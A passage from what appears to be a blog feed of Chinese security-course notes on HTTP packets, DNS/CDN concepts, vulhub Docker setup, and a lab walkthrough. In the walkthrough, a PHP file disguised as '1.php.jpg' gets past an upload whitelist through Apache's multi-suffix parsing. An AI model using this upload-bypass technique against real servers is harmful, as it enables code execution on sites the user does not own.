src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20210609.png" alt="后缀解析"><br>不同扩展名对应指定可执行文件路径，可以不同扩展名指定相同可执行文件。但是如果没有指定，那解析时就会出问题。</p><h2 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h2><h3 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211614.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211709.png"><br>通过身份验证限制，需要用户名和密码才能进入站点，不允许匿名访问。</p><h3 id="IP地址和域名限制"><a href="#IP地址和域名限制" class="headerlink" title="IP地址和域名限制"></a>IP地址和域名限制</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20212144.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20213112.png"><br>设置限制IP地址或者域名，以设定访问权限。</p><h2 id="Web后门与用户及文件权限"><a href="#Web后门与用户及文件权限" class="headerlink" title="Web后门与用户及文件权限"></a>Web后门与用户及文件权限</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20214430.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20215034.png"></p><p>匿名登录的用户会出现在列表当中。<br>通过设置权限，可以限制后门访问文件。</p><h2 id="演示实例"><a href="#演示实例" class="headerlink" title="演示实例"></a>演示实例</h2><ul><li>基于中间件的简要识别<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%202158031.png"><br>在审查元素当中，可以看到response headers，在Server中可以判断出是IIS6.0。</li></ul><ul><li>基于中间件的安全漏洞<br>通过查阅资料等，就可以知道这个平台有哪些漏洞。</li><li>基于中间件的靶场使用<br><a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h3 id="演示Apache-HTTPD-多后缀解析漏洞"><a href="#演示Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="演示Apache HTTPD 多后缀解析漏洞"></a>演示Apache HTTPD 多后缀解析漏洞</h3><ul><li>第一步，首先在Ubuntu系统当中<a href="https://m78alien.github.io/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/">安装好docker环境</a>，并下载文件</li><li>第二步，在vulhub网站找到想做的环境，<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a><br>建议先去网站看看漏洞内容的描述，Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212552.png"></li><li>第三步，在Ubuntu终端当中，打开到<code>vulhub-master</code>文件夹，进入到指定的文件路径中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212953.png"></li><li>第四步，搭建环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213201.png"></li><li>第五步，在物理机浏览器中，输入虚拟机的IP地址以打开网站<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213749.png"></li><li>第六步，创建一个文件<code>1.php.jpg</code>，通过notepad++打开，并键入以下内容，电脑将这个文件识别为jpg图片<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>第七步，在网站当中选择该文件，并提交<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214038.png"></li><li>第八步，在网址栏IP后输入&#x2F;uploadfiles&#x2F;1.php.jpg，发现打开的是PHP文件，而非jpg文件，因此可以通过这个方法，造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214218.png"></li><li>第九步，最后键入以下指令，关闭环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214924.png"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu搭建vulhub漏洞靶场</title>
      <link href="/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><a href="https://vulhub.org/">vulhub官网</a><br>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>首先进入root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt install docker</span><br></pre></td></tr></table></figure><p>查看是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225631.png"></p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225946.png"><br>查看pip是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230034.png"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>使用pip安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230320.png"></p><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><p>百度网盘下载：<a href="https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666">https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666</a><br>复制到Ubuntu当中，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230531.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞靶场 </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day02基础入门-数据包拓展</title>
      <link href="/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="数据包拓展"><a href="#数据包拓展" class="headerlink" title="数据包拓展"></a>数据包拓展</h1><h2 id="http-https数据包"><a href="#http-https数据包" class="headerlink" title="http&#x2F;https数据包"></a>http&#x2F;https数据包</h2><h3 id="http协议是什么"><a href="#http协议是什么" class="headerlink" title="http协议是什么"></a>http协议是什么</h3><ol><li>HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</li><li>设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。</li><li>HTTP有多个版本，目前广泛使用的是HTTP&#x2F;1.1版本。</li></ol><h3 id="HTTP原理"><a href="#HTTP原理" class="headerlink" title="HTTP原理"></a>HTTP原理</h3><ol><li>HTTP是一个基于TCP&#x2F;IP通信协议来传递数据的协议，传输的数据类型为HTML文件、图片文件、查询结果等。</li><li>HTTP协议一般用于B&#x2F;S架构（）。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</li></ol><h3 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h3><ol><li>http协议支持客户端&#x2F;服务端模式，也是一种请求&#x2F;响应模式的协议。</li><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有<code>GET</code>、<code>HEAD</code>、<code>POST</code>。</li><li>灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</li><li>无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</li><li>无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</li></ol><h3 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h3><ol><li>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</li><li>URI：Uniform Resource Identifier 统一资源标识符</li><li>URL：Uniform Resource Location 统一资源定位符</li><li>URI 是用来标示一个具体的资源的，我们可以通过 URI 知道一个资源是什么。</li><li>URL 则是用来定位具体的资源的，标示了一个具体的资源位置。互联网上的每个文件都有一个唯一的URL。</li></ol><h3 id="HTTP报文组成"><a href="#HTTP报文组成" class="headerlink" title="HTTP报文组成"></a>HTTP报文组成</h3><ol><li>请求行：包括请求方法、URL、协议&#x2F;版本</li><li>请求头(Request Header)</li><li>请求正文</li></ol><h3 id="http通信过程"><a href="#http通信过程" class="headerlink" title="http通信过程"></a>http通信过程</h3><p>建立连接—&gt;发送请求数据包—&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与web服务器之间的连接</p><ol><li>浏览器建立与web服务器之间的连接</li><li>浏览器将请求数据打包（生成请求数据包）并发送到web服务器</li><li>web服务器将处理结果打包（生成响应数据包）并发送给浏览器</li><li>web服务器关闭连接</li></ol><h3 id="https传输数据流程"><a href="#https传输数据流程" class="headerlink" title="https传输数据流程"></a>https传输数据流程</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20163111.png" alt="https传输数据流程"></p><ol><li>首先客户端通过URL访问服务器建立SSL连接。</li><li>服务端收到客户端请求后，会将网站支持的证书信息（证书中包含公钥）传送一份给客户端。</li><li>客户端的服务器开始协商SSL连接的安全等级，也就是信息加密的等级。</li><li>客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</li><li>服务器利用自己的私钥解密出会话密钥。</li><li>服务器利用会话密钥加密与客户端之间的通信。</li></ol><h2 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a>Request请求数据包数据格式</h2><ol><li>请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</li><li>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</li><li>空行：请求头与请求体之间用一个空行隔开</li><li>请求体：要发送的数据（一般post提交会使用）；例：<code>user=123&amp;pass=123</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">GET / HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3; timezone=8 </span><br><span class="line">Host: xiaodi8.com </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br></pre></td></tr></table></figure></li></ol><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><ol><li>HTTP 规划定义了 8 种可能的请求方法：<ul><li>GET：检索 URL 中标识资源的一个简单请求  </li><li>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档  </li><li>POST：服务器接受被写入客户端输出流中的数据的请求  </li><li>PUT：服务器保存请求数据作为指定 URL 新内容的请求  </li><li>DELETE：服务器删除 URL 中命令的资源的请求  </li><li>OPTIONS：关于服务器支持的请求方法信息的请求  </li><li>TRACE：web 服务器反馈 Http 请求和其头标的请求  </li><li>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</li></ul></li></ol><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><ol><li>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。  <ul><li>HOST: 主机或域名地址  </li><li>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。  </li><li>User-Agent：是客户浏览器名称  </li><li>Host：对应网址 URL 中的 Web 名称和端口号。  </li><li>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。  </li><li>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接  </li><li>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。  </li><li>Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 &#x2F;icconcept&#x2F;index.jsp中 点 击 一 个 链 接 到 网 页&#x2F;icwork&#x2F;search ， 在 向 服 务 器 发 送 的 GET&#x2F;icwork&#x2F;search 中 的 请 求 中 ， Referer 是<a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。  </li><li>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。  </li><li>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.  </li><li>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li></ul></li></ol><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><ul><li>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</li></ul><h3 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h3><ul><li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /zb_system/cmd.php?act=search HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Content-Length: 3 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3 </span><br><span class="line">Host: www.xiaodi8.com </span><br><span class="line">Origin: http://xiaodi8.com </span><br><span class="line">Referer: http://xiaodi8.com/ </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br><span class="line"></span><br><span class="line">q=1</span><br></pre></td></tr></table></figure></li></ul><h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><ul><li>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</li></ul><ol><li>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔  </li><li>响应头标：包含服务器类型、日期、长度、内容类型等  </li><li>空行：响应头与响应体之间用空行隔开  </li><li>响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Response Header</span><br><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Tue, 29 Aug 2023 07:57:46 GMT </span><br><span class="line">Server: Apache/2.4.46 (Win32) OpenSSL/1.1.1g mod_fcgid/2.3.9a </span><br><span class="line">X-Powered-By: PHP/5.4.45 </span><br><span class="line">Product: Z-BlogPHP 1.6.6 Valyria </span><br><span class="line">X-XSS-Protection: 1; mode=block </span><br><span class="line">Set-Cookie: ZDEDebuggerPresent=php,phtml,php3; path=/ </span><br><span class="line">Upgrade: h2,h2c </span><br><span class="line">Connection: Upgrade, Keep-Alive </span><br><span class="line">Vary: Accept-Encoding </span><br><span class="line">Content-Encoding: gzip </span><br><span class="line">Content-Length: 3157 </span><br><span class="line">Keep-Alive: timeout=5, max=100 </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></li></ol><ul><li>响应数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20160122.png" alt="响应数据"></li></ul><h3 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h3><pre><code>1xx：信息，请求收到，继续处理  2xx：成功，行为被成功地接受、理解和采纳  3xx：重定向，为了完成请求，必须进一步执行的动作  4xx：客户端错误  5xx：服务器错误-200 存在文件403 存在文件夹3xx 均可能存在404 不存在文件及文件夹500 均可能存在</code></pre><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%201609461.png" alt="响应码"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20161415.png"></p><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a>、<a href="https://mp.weixin.qq.com/s/hF0sNnZbqnNfSqzZlzYsmA">0x00实验室</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day01基础入门-概念名词</title>
      <link href="/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="什么是域名"><a href="#什么是域名" class="headerlink" title="什么是域名"></a>什么是域名</h3><p>相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br>网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数据串。</p><h3 id="域名在哪里注册？"><a href="#域名在哪里注册？" class="headerlink" title="域名在哪里注册？"></a>域名在哪里注册？</h3><ol><li>Godaddy</li><li>Gandi</li><li>Hover</li><li>Namesilo</li><li>Namecheap</li><li>万网</li></ol><h3 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h3><ol><li>顶级域名:又叫一级域名,一串字符串中间一个点隔开,例如 baidu.com。顶级域名是互联网DNS等级之中的最高级的域,它保存于DNS根域的名字空间中。</li><li>二级域名:实际上就是一个一级域名以下的主机名,一串字符串中间两个“.”隔开,例如 <a href="http://www.baidu.com/">www.baidu.com</a> 。二级域名就是最靠近顶级域名左侧的字段。</li><li>三级域名:二级域名的子域名,特征是包含三个“.”,例如___.___.baidu.com…</li></ol><h3 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h3><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h3><p>域名系统(Domain Name System,DNS)是Internet上解决网上机器命名的一种系统。 就像拜访朋友要先知道别人家怎么走一样，Internet上当一台主机要访问另外一台主机时，必须首先获知其地址，TCP&#x2F;IP中的IP地址是由四段以“.”分开的数字组成(此处以IPv4的地址为例，IPv6的地址同理)，记起来总是不如名字那么方便，所以，就采用了域名系统来管理名字和IP的对应关系。</p><h3 id="本地Hosts与DNS的关系"><a href="#本地Hosts与DNS的关系" class="headerlink" title="本地Hosts与DNS的关系"></a>本地Hosts与DNS的关系</h3><ol><li>Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。</li><li>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</li><li>浏览器访问网站，要首先通过DNS服务器把要访问的网站域名解析成一个唯一的IP地址，之后，浏览器才能对此网站进行定位并且访问其数据。<br><strong>如何查看本地Hosts文件：</strong></li><li><code>Win</code> + <code>R</code>：打开运行输入<code>drivers</code></li><li>输入：<code>c:\windows\system32\drivers\etc</code></li><li>选择使用<code>记事本</code>或者<code>Notepad</code>、<code>Vs Code</code> 等编程软件打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20143352.png" alt="截图"></li></ol><h3 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h3><ol><li>CDN的全称是Content DeliveryNetwork，即内容分发网络。</li><li>CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</li><li>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。</li><li>使用CDN的目的：是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。<br>通过超级ping的网站可以看到CDN的解析情况<a href="https://www.ping.cn/ping/cdivtc.com">https://www.ping.cn/ping/cdivtc.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144311.png" alt="截图"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144614.png" alt="截图"></li></ol><h3 id="常见的DNS安全攻击有哪些？"><a href="#常见的DNS安全攻击有哪些？" class="headerlink" title="常见的DNS安全攻击有哪些？"></a>常见的DNS安全攻击有哪些？</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><p>DDoS攻击也叫做分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器。其他服务器的回复会被发送到被伪造服务器的真实地址，造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</p><h4 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" 